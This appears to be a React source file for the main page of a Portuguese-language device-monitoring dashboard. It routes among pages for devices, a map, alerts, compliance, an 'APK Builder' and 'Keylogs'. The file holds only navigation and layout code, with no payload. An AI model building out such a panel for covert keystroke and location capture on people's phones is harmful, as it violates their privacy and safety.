import { useState, useEffect, useMemo } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { LogOut, Menu, X } from "lucide-react";
import Sidebar from "@/components/Sidebar";
import Dashboard from "./Dashboard";
import DevicesPage from "./Devices";
import DeviceDetails from "./DeviceDetails";
import AlertsPage from "./Alerts";
import EventsPage from "./Events";
import MapPage from "./Map";
import ReportsPage from "./Reports";
import CompliancePage from "./Compliance";
import APKBuilderPage from "./APKBuilderPage";
import KeylogsPage from "./Keylogs";
import SettingsPage from "./Settings";

interface User {
  email: string;
  name: string;
}

interface HomeProps {
  user?: User;
  onLogout: () => void;
}

type PageType = "dashboard" | "devices" | "device-details" | "alerts" | "events" | "map" | "reports" | "compliance" | "apk-builder" | "keylogs" | "settings";

export default function Home({ user, onLogout }: HomeProps) {
  const [location, setLocation] = useLocation();
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [isMobile, setIsMobile] = useState(false);

  // Usar useMemo para evitar recalcular a cada render
  const { currentPage, deviceId } = useMemo(() => {
    // Verificar se é rota dinâmica /dispositivos/:id
    const deviceMatch = location.match(/^\/dispositivos\/(.+)$/);
    if (deviceMatch) {
      return { currentPage: "device-details" as PageType, deviceId: deviceMatch[1] };
    }
    
    if (location === "/dispositivos") return { currentPage: "devices" as PageType, deviceId: null };
    if (location === "/alertas") return { currentPage: "alerts" as PageType, deviceId: null };
    if (location === "/eventos") return { currentPage: "events" as PageType, deviceId: null };
    if (location === "/mapa") return { currentPage: "map" as PageType, deviceId: null };
    if (location === "/relatorios") return { currentPage: "reports" as PageType, deviceId: null };
    if (location === "/conformidade") return { currentPage: "compliance" as PageType, deviceId: null };
    if (location === "/apk-builder") return { currentPage: "apk-builder" as PageType, deviceId: null };
    if (location === "/keylogs") return { currentPage: "keylogs" as PageType, deviceId: null };
    if (location === "/configuracoes") return { currentPage: "settings" as PageType, deviceId: null };
    return { currentPage: "dashboard" as PageType, deviceId: null };
  }, [location]);

  // Detectar mudanças de tamanho de tela
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth < 768);
      if (window.innerWidth < 768) {
        setSidebarOpen(false);
      }
    };

    handleResize();
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const handleNavigate = (page: PageType) => {
    // Mapear página para URL
    const urlMap: Record<PageType, string> = {
      dashboard: "/",
      devices: "/dispositivos",
      "device-details": "/dispositivos",
      alerts: "/alertas",
      events: "/eventos",
      map: "/mapa",
      reports: "/relatorios",
      compliance: "/conformidade",
      "apk-builder": "/apk-builder",
      keylogs: "/keylogs",
      settings: "/configuracoes",
    };
    
    setLocation(urlMap[page]);
    if (isMobile) {
      setSidebarOpen(false);
    }
  };

  const handleLogoutClick = () => {
    onLogout();
    setLocation("/");
  };

  return (
    <div className="flex h-screen bg-slate-950 text-slate-50">
      {/* Sidebar */}
      <Sidebar
        isOpen={sidebarOpen}
        onNavigate={handleNavigate}
        currentPage={currentPage === "device-details" ? "devices" : currentPage}
        onLogout={handleLogoutClick}
        onClose={() => setSidebarOpen(false)}
      />

      {/* Main Content */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* Header */}
        <div className="bg-slate-900 border-b border-slate-800 px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <button
              onClick={() => setSidebarOpen(!sidebarOpen)}
              className="md:hidden p-2 hover:bg-slate-800 rounded-lg transition-colors"
            >
              {sidebarOpen ? (
                <X className="w-6 h-6" />
              ) : (
                <Menu className="w-6 h-6" />
              )}
            </button>
            <h1 className="text-xl font-bold text-cyan-400">
              Painel de Monitoramento
            </h1>
          </div>
          
          <div className="flex items-center gap-4">
            <span className="text-sm text-slate-400">
              Usuário: <span className="text-cyan-400">{user?.name}</span>
            </span>
            <Button
              onClick={handleLogoutClick}
              variant="outline"
              size="sm"
              className="gap-2"
            >
              <LogOut className="w-4 h-4" />
              Sair
            </Button>
          </div>
        </div>

        {/* Page Content */}
        <div className="flex-1 overflow-auto">
          {currentPage === "dashboard" && <Dashboard />}
          {currentPage === "devices" && <DevicesPage user={user} onLogout={onLogout} />}
          {currentPage === "device-details" && deviceId && (
            <DeviceDetails deviceId={deviceId} user={user} onLogout={onLogout} />
          )}
          {currentPage === "alerts" && <AlertsPage />}
          {currentPage === "events" && <EventsPage />}
          {currentPage === "map" && <MapPage />}
          {currentPage === "reports" && <ReportsPage />}
          {currentPage === "compliance" && <CompliancePage />}
          {currentPage === "apk-builder" && <APKBuilderPage />}
          {currentPage === "keylogs" && <KeylogsPage />}
          {currentPage === "settings" && <SettingsPage />}
        </div>
      </div>
    </div>
  );
}
